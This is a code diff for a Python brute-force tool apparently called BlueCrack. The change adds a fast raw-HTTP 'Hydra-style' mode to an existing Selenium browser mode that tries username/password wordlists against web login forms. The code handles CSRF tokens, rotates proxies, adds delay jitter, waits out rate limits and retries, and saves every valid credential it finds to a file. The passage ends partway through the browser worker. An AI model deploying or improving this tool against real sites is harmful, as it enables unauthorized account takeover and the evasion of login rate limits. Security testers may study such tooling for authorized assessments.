@@ -2,6 +2,10 @@
 BlueCrack CLI Attack Module
 ============================
 Brute-force attack controller for CLI and Interactive Wizard modes.
+
+Supports two attack modes:
+  - **browser** (default): Selenium-based, uses a real Chrome browser
+  - **http**: Raw HTTP POST requests (Hydra-style), orders of magnitude faster
 """
 
 import argparse
@@ -13,14 +17,6 @@ import threading
 import time
 from queue import Queue
 from typing import Any, Dict, List, Optional, Set, Tuple
-
-from selenium import webdriver
-from selenium.common.exceptions import (
-    NoSuchElementException,
-    WebDriverException,
-)
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
 
 from .constants import (
     _BLUE,
@@ -65,8 +61,25 @@ def run_attack_cli(args: argparse.Namespace) -> None:
     try:
         # INTERACTIVE MODE
         auto_detect = False
+        attack_mode = getattr(args, "mode", "browser")
+
         if args.interactive:
             print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")
+
+            # MODE SELECTION
+            mode_input = (
+                input(
+                    f"\nAttack mode? [{_GREEN}http{_RESET}=raw HTTP (fast), "
+                    f"{_CYAN}browser{_RESET}=Selenium (for JS sites)] "
+                    f"[default: http]: "
+                )
+                .strip()
+                .lower()
+            )
+            if mode_input in ("browser", "b"):
+                attack_mode = "browser"
+            else:
+                attack_mode = "http"
 
             # CUPP Integration
             run_cupp = (
@@ -159,12 +172,35 @@ def run_attack_cli(args: argparse.Namespace) -> None:
             ).strip().lower()
             args.continue_after_success = cont_str == "y"
 
-            auto_detect = (
-                input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
-                .strip()
-                .lower()
-                != "n"
-            )
+            if attack_mode == "browser":
+                auto_detect = (
+                    input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
+                    .strip()
+                    .lower()
+                    != "n"
+                )
+            elif attack_mode == "http":
+                # HTTP-specific wizard questions
+                form_action_in = input(
+                    "Form action URL (leave blank to auto-detect): "
+                ).strip()
+                if form_action_in:
+                    args.form_action = form_action_in
+                ufield_in = input(
+                    "Username field name (leave blank to auto-detect): "
+                ).strip()
+                if ufield_in:
+                    args.username_field = ufield_in
+                pfield_in = input(
+                    "Password field name (leave blank to auto-detect): "
+                ).strip()
+                if pfield_in:
+                    args.password_field = pfield_in
+                csrf_in = input(
+                    "CSRF token field name (leave blank to auto-detect): "
+                ).strip()
+                if csrf_in:
+                    args.csrf_field = csrf_in
         else:
             auto_detect = False
             if not args.url:
@@ -198,19 +234,14 @@ def run_attack_cli(args: argparse.Namespace) -> None:
 
         # LOAD PROXIES
         proxies: List[str] = []
-        if args.proxy:
+        if getattr(args, "proxy", None):
             proxies.append(args.proxy)
-        if args.proxyfile:
+        if getattr(args, "proxyfile", None):
             with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
                 for line in f:
                     if line.strip():
                         proxies.append(line.strip())
 
-        USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
-        WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
-        PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"
-
-        THREADS: int = args.threads
         TARGET_URL: str = args.url
         if (
             TARGET_URL
@@ -219,383 +250,578 @@ def run_attack_cli(args: argparse.Namespace) -> None:
         ):
             TARGET_URL = "http://" + TARGET_URL
 
-        ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
-        SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
-        LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
-        COOLDOWN: int = args.cooldown
-        DELAY: float = args.delay
-        JITTER: float = args.jitter
-        RUN_HEADLESS: bool = args.headless
-        MAX_ATTEMPTS: int = args.max_attempts
-        CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
-        OUTPUT_FILE: str = args.output
-        JSON_REPORT: bool = args.json_report
+        # ═══════════════════════════════════════════════════════════
+        # HTTP MODE — Raw HTTP requests (Hydra-style)
+        # ═══════════════════════════════════════════════════════════
+        if attack_mode == "http":
+            _run_http_attack(
+                args, users, passwords, proxies, TARGET_URL,
+                _GLOBAL_STOP, _FOUND_EVENT,
+            )
+            return
 
-        # LAUNCH SELENIUM (setup browser)
-        driver = webdriver.Chrome()
-        driver.get(TARGET_URL)
-
-        username_selector: Optional[str] = None
-        password_selector: Optional[str] = None
-
-        print("\n==============================")
-        print("   BROWSER BRUTE TESTER")
-        print("==============================\n")
-        print(f"Target URL: {TARGET_URL}")
-        print(f"User: {USERNAME_FIXED}")
-        print(f"Wordlist: {WORDLIST}")
-        print(f"Proxies: {PROXY_INFO}")
-        print(f"Threads: {THREADS}")
-        print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
-        if MAX_ATTEMPTS > 0:
-            print(f"Max Attempts: {MAX_ATTEMPTS}")
-        if CONTINUE_AFTER_SUCCESS:
-            print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")
-
-        # Inject JS to track last clicked element
-        driver.execute_script(CLICK_LISTENER_JS)
-
-        # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
-        def get_css_selector() -> Optional[str]:
-            elem = driver.execute_script("return window._lastClicked")
-            if elem is None:
-                return None
-            return driver.execute_script(CSS_PATH_JS, elem)
-
-        if auto_detect:
-            print(f"\n{_CYAN}[*] Auto-detecting login form fields...{_RESET}")
-            time.sleep(2)
-            try:
-                driver.execute_script(AUTO_DETECT_JS)
-                detected_selectors = driver.execute_script("return window._autoFindFields();")
-                if detected_selectors and detected_selectors[0] and detected_selectors[1]:
-                    username_selector, password_selector = detected_selectors
-                    print(f"{_GREEN}[+] AUTO-DETECTED Username: {username_selector}{_RESET}")
-                    print(f"{_GREEN}[+] AUTO-DETECTED Password: {password_selector}{_RESET}")
-                else:
-                    print(f"{_RED}[-] Auto-detect failed. Please lock manually.{_RESET}")
-                    auto_detect = False
-            except Exception as e:
-                print(
-                    f"{_RED}[-] Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
-                )
-                auto_detect = False
-
-        # WAIT FOR USER TO LOCK FIELDS
-        if not auto_detect:
-            print(f"\n{_CYAN}[>] CLICK username field → press S{_RESET}")
-            print(f"{_CYAN}[>] CLICK password field → press T{_RESET}")
-            print(f"{_CYAN}[>] Press ENTER to start brute{_RESET}\n")
-
-            if not HAS_KEYBOARD:
-                raise SystemExit(f"{_RED}[-] keyboard library not available. Auto-detect failed and manual override requires keyboard library.{_RESET}")
-
-            while username_selector is None or password_selector is None:
-                if keyboard.is_pressed("s"):
-                    css = get_css_selector()
-                    if css:
-                        username_selector = css
-                        print(f"{_BLUE}[+] Username selector LOCKED: {css}{_RESET}")
-                    time.sleep(0.3)
-                if keyboard.is_pressed("t"):
-                    css = get_css_selector()
-                    if css:
-                        password_selector = css
-                        print(f"{_BLUE}[+] Password selector LOCKED: {css}{_RESET}")
-                    time.sleep(0.3)
-
-        print("\nSelectors locked! Press ENTER to launch brute...")
-
-        # TEST THE SELECTORS IMMEDIATELY
-        driver.find_element(By.CSS_SELECTOR, username_selector)
-        driver.find_element(By.CSS_SELECTOR, password_selector)
-
-        if HAS_KEYBOARD:
-            keyboard.wait("enter")
-        else:
-            time.sleep(1)
-
-        # Close the initial setup driver
-        try:
-            driver.quit()
-        except Exception:
-            pass
-
-        # LOAD WORDLIST INTO QUEUE
-        q: Queue = Queue(maxsize=1000)
-        total_combos: int = len(users) * len(passwords)
-
-        # CLI metrics
-        _cli_metrics: Dict[str, int] = {
-            "attempted": 0,
-            "successes": 0,
-            "failures": 0,
-            "errors": 0,
-            "rate_limit_hits": 0,
-            "skipped_empty": 0,
-            "requeued": 0,
-        }
-        _cli_metrics_lock = threading.Lock()
-        _cli_found_creds: List[Tuple[str, str]] = []
-        _cli_found_creds_lock = threading.Lock()
-        _cli_found_users: Set[str] = set()
-        _cli_found_users_lock = threading.Lock()
-        _cli_start_time: float = time.time()
-
-        def populate() -> None:
-            for user in users:
-                for pwd in passwords:
-                    q.put((user, pwd))
-
-        threading.Thread(target=populate, daemon=True).start()
-
-        # WORKER FUNCTION
-        def worker() -> None:
-            ctx: Dict[str, Any] = {
-                "headless": RUN_HEADLESS,
-                "proxies": proxies,
-                "use_tor": False,
-            }
-            options = build_chrome_options(ctx)
-            thread_driver = create_driver_safe(options)
-            if thread_driver is None:
-                print(f"{_RED}[-] Thread startup error: could not create WebDriver{_RESET}")
-                return
-
-            try:
-                while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
-                    # Check max attempts
-                    if MAX_ATTEMPTS > 0:
-                        with _cli_metrics_lock:
-                            if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
-                                break
-
-                    # Check if we should stop (non-continue mode)
-                    if not CONTINUE_AFTER_SUCCESS and _FOUND_EVENT.is_set():
-                        break
-
-                    try:
-                        user, pwd = q.get(timeout=1)
-                    except Exception:
-                        break
-
-                    # Skip empty passwords
-                    if not pwd or str(pwd).strip() == "":
-                        with _cli_metrics_lock:
-                            _cli_metrics["skipped_empty"] += 1
-                        q.task_done()
-                        continue
-
-                    # Skip already solved users (unless continue mode)
-                    if not CONTINUE_AFTER_SUCCESS:
-                        with _cli_found_users_lock:
-                            if user in _cli_found_users:
-                                q.task_done()
-                                continue
-
-                    try:
-                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
-                            break
-                        if _GLOBAL_STOP.is_set():
-                            break
-
-                        # Add delay if configured
-                        actual_delay: float = DELAY
-                        if JITTER > 0.0:
-                            actual_delay += random.uniform(0, JITTER)
-
-                        if actual_delay > 0.0:
-                            for _ in range(int(actual_delay * 10)):
-                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
-                                    break
-                                time.sleep(0.1)
-
-                        if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
-                            break
-
-                        thread_driver.get(TARGET_URL)
-                        if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
-                            break
-
-                        try:
-                            u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
-                            p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
-                            u.clear()
-                            u.send_keys(user)
-                            p.clear()
-                            p.send_keys(pwd)
-                            p.send_keys(Keys.ENTER)
-
-                            with _cli_metrics_lock:
-                                _cli_metrics["attempted"] += 1
-                                attempt_num = _cli_metrics["attempted"]
-
-                            if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
-                                break
-
-                            print(
-                                f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
-                            )
-
-                            # Wait for login to process
-                            for _ in range(20):
-                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
-                                    break
-                                time.sleep(0.1)
-
-                            if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
-                                break
-
-                            # Check page
-                            page_source: str = thread_driver.page_source.lower()
-                            current_url: str = thread_driver.current_url
-
-                            # Check for rate limiting first
-                            if LIMIT_TEXT and LIMIT_TEXT in page_source:
-                                print(
-                                    f"[{attempt_num}/{total_combos}] {_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
-                                )
-                                with _cli_metrics_lock:
-                                    _cli_metrics["rate_limit_hits"] += 1
-                                if COOLDOWN > 0:
-                                    print(
-                                        f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}{_RESET}"
-                                    )
-                                    for _ in range(COOLDOWN * 10):
-                                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
-                                            break
-                                        time.sleep(0.1)
-                                    if not _FOUND_EVENT.is_set() or CONTINUE_AFTER_SUCCESS:
-                                        q.put((user, pwd))
-                                        with _cli_metrics_lock:
-                                            _cli_metrics["requeued"] += 1
-                                else:
-                                    print(
-                                        f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
-                                    )
-                                q.task_done()
-                                continue
-
-                            # Check explicit error
-                            if ERROR_MSG and ERROR_MSG in page_source:
-                                with _cli_metrics_lock:
-                                    _cli_metrics["failures"] += 1
-                                q.task_done()
-                                continue
-
-                            # Determine success
-                            is_success = False
-                            if SUCCESS_MSG:
-                                if SUCCESS_MSG in page_source:
-                                    is_success = True
-                                else:
-                                    with _cli_metrics_lock:
-                                        _cli_metrics["failures"] += 1
-                                    q.task_done()
-                                    continue
-                            elif current_url != TARGET_URL and "login" not in current_url.lower():
-                                is_success = True
-                            elif ERROR_MSG:
-                                is_success = True
-
-                            if is_success:
-                                print(
-                                    f"\n{_GREEN}{_BOLD}[+] VALID CREDENTIALS FOUND: {user} / {pwd}{_RESET}\n"
-                                )
-                                with _cli_metrics_lock:
-                                    _cli_metrics["successes"] += 1
-                                with _cli_found_creds_lock:
-                                    _cli_found_creds.append((user, pwd))
-                                with _cli_found_users_lock:
-                                    _cli_found_users.add(user)
-
-                                try:
-                                    with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
-                                        cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
-                                except Exception as e:
-                                    print(f"{_RED}[-] Could not save credential: {e}{_RESET}")
-
-                                if not CONTINUE_AFTER_SUCCESS:
-                                    _FOUND_EVENT.set()
-                                    with q.mutex:
-                                        q.queue.clear()
-                                    q.task_done()
-                                    break
-                            else:
-                                with _cli_metrics_lock:
-                                    _cli_metrics["failures"] += 1
-
-                        except (NoSuchElementException, WebDriverException):
-                            with _cli_metrics_lock:
-                                _cli_metrics["errors"] += 1
-                            print(
-                                f"{_RED}[-] Error during attempt with '{user} / {pwd}': element not found or page load issue.{_RESET}"
-                            )
-                    except Exception as e:
-                        with _cli_metrics_lock:
-                            _cli_metrics["errors"] += 1
-                        print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
-                    finally:
-                        q.task_done()
-            finally:
-                try:
-                    thread_driver.quit()
-                except Exception:
-                    pass
-
-        # THREAD LAUNCHER
-        threads_list: List[threading.Thread] = []
-        print(f"\n[*] Starting {THREADS} threads...\n")
-        try:
-            for _ in range(THREADS):
-                t = threading.Thread(target=worker)
-                t.daemon = True
-                t.start()
-                threads_list.append(t)
-
-            # Wait for completion
-            while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
-                time.sleep(0.1)
-
-            if not _FOUND_EVENT.is_set():
-                q.join()
-
-            cli_end_time = time.time()
-
-            if not _FOUND_EVENT.is_set():
-                print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
-            else:
-                print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")
-
-            # Print summary
-            print(f"\n{_CYAN}═══ Attack Summary ═══{_RESET}")
-            for k, v in _cli_metrics.items():
-                print(f"  {k}: {v}")
-            elapsed = cli_end_time - _cli_start_time
-            print(f"  elapsed: {elapsed:.1f}s")
-            if _cli_metrics["attempted"] > 0 and elapsed > 0:
-                print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")
-
-            # Save JSON report if requested
-            if JSON_REPORT:
-                save_json_report(
-                    "bluecrack_cli_report.json",
-                    TARGET_URL,
-                    _cli_metrics,
-                    _cli_found_creds,
-                    _cli_start_time,
-                    cli_end_time,
-                )
-                print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")
-
-        except KeyboardInterrupt:
-            print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
-            _FOUND_EVENT.set()
-            _GLOBAL_STOP.set()
-        finally:
-            if _GLOBAL_STOP.is_set() and not _FOUND_EVENT.is_set():
-                print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
+        # ═══════════════════════════════════════════════════════════
+        # BROWSER MODE — Selenium WebDriver
+        # ═══════════════════════════════════════════════════════════
+        _run_browser_attack(
+            args, users, passwords, proxies, TARGET_URL,
+            auto_detect, _GLOBAL_STOP, _FOUND_EVENT,
+        )
 
     finally:
         # Restore original signal handler
         signal.signal(signal.SIGINT, old_sig)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# HTTP MODE IMPLEMENTATION
+# ═══════════════════════════════════════════════════════════════════
+
+
+def _run_http_attack(
+    args: argparse.Namespace,
+    users: List[str],
+    passwords: List[str],
+    proxies: List[str],
+    target_url: str,
+    global_stop: threading.Event,
+    found_event: threading.Event,
+) -> None:
+    """Run the raw HTTP attack using HTTPAttackEngine."""
+    from .http_engine import HTTPAttackEngine
+
+    THREADS: int = args.threads if args.threads > 1 else 4  # Default higher for HTTP
+    ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
+    SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
+    LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
+    MAX_ATTEMPTS: int = args.max_attempts
+    CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
+    JSON_REPORT: bool = args.json_report
+
+    # Parse extra fields
+    extra_fields: Dict[str, str] = {}
+    extra_fields_raw = getattr(args, "extra_fields", "")
+    if extra_fields_raw:
+        for pair in extra_fields_raw.split(","):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                extra_fields[k.strip()] = v.strip()
+
+    USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
+    WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
+    PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"
+
+    print("\n==============================")
+    print(f"   {_BOLD}⚡ HTTP BRUTE MODE (Hydra-style){_RESET}")
+    print("==============================\n")
+    print(f"Target URL: {target_url}")
+    print(f"User: {USERNAME_FIXED or f'{len(users)} users'}")
+    print(f"Wordlist: {WORDLIST}")
+    print(f"Proxies: {PROXY_INFO}")
+    print(f"Threads: {THREADS}")
+    if MAX_ATTEMPTS > 0:
+        print(f"Max Attempts: {MAX_ATTEMPTS}")
+    if CONTINUE_AFTER_SUCCESS:
+        print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")
+
+    engine = HTTPAttackEngine()
+    cli_start_time = time.time()
+
+    # Set up CLI callbacks
+    def log_cb(msg: str) -> None:
+        print(msg)
+
+    def progress_cb(current: int, total: int) -> None:
+        pass  # Speed is printed via metrics
+
+    def finished_cb(found: bool, message: str) -> None:
+        if found:
+            found_event.set()
+
+    engine.set_callbacks(
+        log_cb=log_cb,
+        progress_cb=progress_cb,
+        finished_cb=finished_cb,
+    )
+
+    ctx: Dict[str, Any] = {
+        "target_url": target_url,
+        "users": users,
+        "passwords": passwords,
+        "threads": THREADS,
+        "error_msg": ERROR_MSG,
+        "success_msg": SUCCESS_MSG,
+        "limit_text": LIMIT_TEXT,
+        "delay": args.delay,
+        "jitter": args.jitter,
+        "cooldown": args.cooldown,
+        "max_attempts": MAX_ATTEMPTS,
+        "continue_after_success": CONTINUE_AFTER_SUCCESS,
+        "proxies": proxies,
+        "form_action": getattr(args, "form_action", ""),
+        "username_field": getattr(args, "username_field", ""),
+        "password_field": getattr(args, "password_field", ""),
+        "csrf_field": getattr(args, "csrf_field", ""),
+        "extra_fields": extra_fields,
+        "follow_redirects": getattr(args, "follow_redirects", False),
+    }
+
+    # Start attack (blocking — waits for thread internally)
+    engine.start(ctx)
+
+    # Wait for completion
+    while engine.is_running and not global_stop.is_set():
+        time.sleep(0.2)
+
+    if global_stop.is_set():
+        engine.stop()
+        time.sleep(0.5)
+
+    cli_end_time = time.time()
+    metrics = engine.get_metrics()
+    found_creds = engine.get_found_creds()
+
+    if not found_creds:
+        print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
+    else:
+        print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")
+
+    # Print summary
+    print(f"\n{_CYAN}═══ Attack Summary (HTTP Mode) ═══{_RESET}")
+    for k in ["attempted", "successes", "failures", "errors", "rate_limit_hits", "requeued"]:
+        print(f"  {k}: {metrics.get(k, 0)}")
+    elapsed = cli_end_time - cli_start_time
+    print(f"  elapsed: {elapsed:.1f}s")
+    if metrics.get("attempted", 0) > 0 and elapsed > 0:
+        print(f"  speed: {_GREEN}{metrics['attempted'] / elapsed:.1f} attempts/s{_RESET}")
+
+    # Save JSON report if requested
+    if JSON_REPORT:
+        save_json_report(
+            "bluecrack_cli_report.json",
+            target_url,
+            metrics,
+            found_creds,
+            cli_start_time,
+            cli_end_time,
+        )
+        print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")
+
+
+# ═══════════════════════════════════════════════════════════════════
+# BROWSER MODE IMPLEMENTATION
+# ═══════════════════════════════════════════════════════════════════
+
+
+def _run_browser_attack(
+    args: argparse.Namespace,
+    users: List[str],
+    passwords: List[str],
+    proxies: List[str],
+    target_url: str,
+    auto_detect: bool,
+    global_stop: threading.Event,
+    found_event: threading.Event,
+) -> None:
+    """Run the browser-based Selenium attack."""
+    from selenium import webdriver
+    from selenium.common.exceptions import (
+        NoSuchElementException,
+        WebDriverException,
+    )
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.common.keys import Keys
+
+    USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
+    WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
+    PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"
+
+    THREADS: int = args.threads
+    ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
+    SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
+    LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
+    COOLDOWN: int = args.cooldown
+    DELAY: float = args.delay
+    JITTER: float = args.jitter
+    RUN_HEADLESS: bool = args.headless
+    MAX_ATTEMPTS: int = args.max_attempts
+    CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
+    OUTPUT_FILE: str = args.output
+    JSON_REPORT: bool = args.json_report
+
+    # LAUNCH SELENIUM (setup browser)
+    driver = webdriver.Chrome()
+    driver.get(target_url)
+
+    username_selector: Optional[str] = None
+    password_selector: Optional[str] = None
+
+    print("\n==============================")
+    print("   BROWSER BRUTE TESTER")
+    print("==============================\n")
+    print(f"Target URL: {target_url}")
+    print(f"User: {USERNAME_FIXED}")
+    print(f"Wordlist: {WORDLIST}")
+    print(f"Proxies: {PROXY_INFO}")
+    print(f"Threads: {THREADS}")
+    print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
+    if MAX_ATTEMPTS > 0:
+        print(f"Max Attempts: {MAX_ATTEMPTS}")
+    if CONTINUE_AFTER_SUCCESS:
+        print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")
+
+    # Inject JS to track last clicked element
+    driver.execute_script(CLICK_LISTENER_JS)
+
+    # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
+    def get_css_selector() -> Optional[str]:
+        elem = driver.execute_script("return window._lastClicked")
+        if elem is None:
+            return None
+        return driver.execute_script(CSS_PATH_JS, elem)
+
+    if auto_detect:
+        print(f"\n{_CYAN}[*] Auto-detecting login form fields...{_RESET}")
+        time.sleep(2)
+        try:
+            driver.execute_script(AUTO_DETECT_JS)
+            detected_selectors = driver.execute_script("return window._autoFindFields();")
+            if detected_selectors and detected_selectors[0] and detected_selectors[1]:
+                username_selector, password_selector = detected_selectors
+                print(f"{_GREEN}[+] AUTO-DETECTED Username: {username_selector}{_RESET}")
+                print(f"{_GREEN}[+] AUTO-DETECTED Password: {password_selector}{_RESET}")
+            else:
+                print(f"{_RED}[-] Auto-detect failed. Please lock manually.{_RESET}")
+                auto_detect = False
+        except Exception as e:
+            print(
+                f"{_RED}[-] Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
+            )
+            auto_detect = False
+
+    # WAIT FOR USER TO LOCK FIELDS
+    if not auto_detect:
+        print(f"\n{_CYAN}[>] CLICK username field → press S{_RESET}")
+        print(f"{_CYAN}[>] CLICK password field → press T{_RESET}")
+        print(f"{_CYAN}[>] Press ENTER to start brute{_RESET}\n")
+
+        if not HAS_KEYBOARD:
+            raise SystemExit(
+                f"{_RED}[-] keyboard library not available. "
+                f"Auto-detect failed and manual override requires keyboard library.{_RESET}"
+            )
+
+        while username_selector is None or password_selector is None:
+            if keyboard.is_pressed("s"):
+                css = get_css_selector()
+                if css:
+                    username_selector = css
+                    print(f"{_BLUE}[+] Username selector LOCKED: {css}{_RESET}")
+                time.sleep(0.3)
+            if keyboard.is_pressed("t"):
+                css = get_css_selector()
+                if css:
+                    password_selector = css
+                    print(f"{_BLUE}[+] Password selector LOCKED: {css}{_RESET}")
+                time.sleep(0.3)
+
+    print("\nSelectors locked! Press ENTER to launch brute...")
+
+    # TEST THE SELECTORS IMMEDIATELY
+    driver.find_element(By.CSS_SELECTOR, username_selector)
+    driver.find_element(By.CSS_SELECTOR, password_selector)
+
+    if HAS_KEYBOARD:
+        keyboard.wait("enter")
+    else:
+        time.sleep(1)
+
+    # Close the initial setup driver
+    try:
+        driver.quit()
+    except Exception:
+        pass
+
+    # LOAD WORDLIST INTO QUEUE
+    q: Queue = Queue(maxsize=1000)
+    total_combos: int = len(users) * len(passwords)
+
+    # CLI metrics
+    _cli_metrics: Dict[str, int] = {
+        "attempted": 0,
+        "successes": 0,
+        "failures": 0,
+        "errors": 0,
+        "rate_limit_hits": 0,
+        "skipped_empty": 0,
+        "requeued": 0,
+    }
+    _cli_metrics_lock = threading.Lock()
+    _cli_found_creds: List[Tuple[str, str]] = []
+    _cli_found_creds_lock = threading.Lock()
+    _cli_found_users: Set[str] = set()
+    _cli_found_users_lock = threading.Lock()
+    _cli_start_time: float = time.time()
+
+    def populate() -> None:
+        for user in users:
+            for pwd in passwords:
+                q.put((user, pwd))
+
+    threading.Thread(target=populate, daemon=True).start()
+
+    # WORKER FUNCTION
+    def worker() -> None:
+        ctx: Dict[str, Any] = {
+            "headless": RUN_HEADLESS,
+            "proxies": proxies,
+            "use_tor": False,
+        }
+        options = build_chrome_options(ctx)
+        thread_driver = create_driver_safe(options)
+        if thread_driver is None:
+            print(f"{_RED}[-] Thread startup error: could not create WebDriver{_RESET}")
+            return
+
+        try:
+            while not q.empty() and not found_event.is_set() and not global_stop.is_set():
+                # Check max attempts
+                if MAX_ATTEMPTS > 0:
+                    with _cli_metrics_lock:
+                        if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
+                            break
+
+                # Check if we should stop (non-continue mode)
+                if not CONTINUE_AFTER_SUCCESS and found_event.is_set():
+                    break
+
+                try:
+                    user, pwd = q.get(timeout=1)
+                except Exception:
+                    break
+
+                # Skip empty passwords
+                if not pwd or str(pwd).strip() == "":
+                    with _cli_metrics_lock:
+                        _cli_metrics["skipped_empty"] += 1
+                    q.task_done()
+                    continue
+
+                # Skip already solved users (unless continue mode)
+                if not CONTINUE_AFTER_SUCCESS:
+                    with _cli_found_users_lock:
+                        if user in _cli_found_users:
+                            q.task_done()
+                            continue
+
+                try:
+                    if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
+                        break
+                    if global_stop.is_set():
+                        break
+
+                    # Add delay if configured
+                    actual_delay: float = DELAY
+                    if JITTER > 0.0:
+                        actual_delay += random.uniform(0, JITTER)
+
+                    if actual_delay > 0.0:
+                        for _ in range(int(actual_delay * 10)):
+                            if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
+                                break
+                            time.sleep(0.1)
+
+                    if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
+                        break
+
+                    thread_driver.get(target_url)
+                    if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
+                        break
+
+                    try:
+                        u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
+                        p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
+                        u.clear()
+                        u.send_keys(user)
+                        p.clear()
+                        p.send_keys(pwd)
+                        p.send_keys(Keys.ENTER)
+
+                        with _cli_metrics_lock:
+                            _cli_metrics["attempted"] += 1
+                            attempt_num = _cli_metrics["attempted"]
+
+                        if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
+                            break
+
+                        print(
+                            f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
+                        )
+
+                        # Wait for login to process
+                        for _ in range(20):
+                            if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
+                                break
+                            time.sleep(0.1)
+
+                        if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
+                            break
+
+                        # Check page
+                        page_source: str = thread_driver.page_source.lower()
+                        current_url: str = thread_driver.current_url
+
+                        # Check for rate limiting first
+                        if LIMIT_TEXT and LIMIT_TEXT in page_source:
+                            print(
+                                f"[{attempt_num}/{total_combos}] "
+                                f"{_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
+                            )
+                            with _cli_metrics_lock:
+                                _cli_metrics["rate_limit_hits"] += 1
+                            if COOLDOWN > 0:
+                                print(
+                                    f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds "
+                                    f"before retrying {user}/{pwd}{_RESET}"
+                                )
+                                for _ in range(COOLDOWN * 10):
+                                    if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
+                                        break
+                                    time.sleep(0.1)
+                                if not found_event.is_set() or CONTINUE_AFTER_SUCCESS:
+                                    q.put((user, pwd))
+                                    with _cli_metrics_lock:
+                                        _cli_metrics["requeued"] += 1
+                            else:
+                                print(
+                                    f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
+                                )
+                            q.task_done()
+                            continue
+
+                        # Check explicit error
+                        if ERROR_MSG and ERROR_MSG in page_source:
+                            with _cli_metrics_lock:
